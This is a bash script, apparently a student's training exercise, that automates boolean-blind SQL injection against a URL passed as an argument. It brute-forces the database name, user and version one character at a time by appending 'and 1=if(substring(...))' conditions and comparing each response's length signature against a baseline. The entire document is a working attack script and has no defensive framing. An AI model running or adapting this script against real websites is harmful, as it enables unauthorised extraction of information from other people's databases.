#! /bin/bash
target=$1
resume=1
normal=$(curl -m 30 --retry 3 $target)
count=$(echo $normal | sed 's/br/br\n/g' | grep -c "br")
echo "Target is $target"
for load in database user version
do
	name=""
	for y in $(seq 1 30)
	do
		if [ $resume == 1 ]
		then
			resume=0
			found=0
			for x in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9 . _ \$ 
			do
				if [ ${found} == 0 ]
				then
				#	echo "trying $x"
					curl --retry 3 -sm 30 ${target}%20and+1=if\(substring\(${load}\(\),{$y},1\)=%27{$x}%27,1,0\) > test1 
					count2=$(sed 's/br/br\n/g' test1 | grep -c "br")
					if [[ $count == $count2 ]]
					then 
						echo "a letter is found: $x" 
						resume=1
						found=1
						name=${name}$x
					fi
				fi
			done
		fi
	done
	echo "Target is $target"
	echo "Target is $target
	Your Database name is :$name"
	resume=1
done
echo "Target is $target"
echo "Target is $target
Your Database name is :$name"
rm test1
#### by Abdelsalam Abbas
### ITI_SA_37
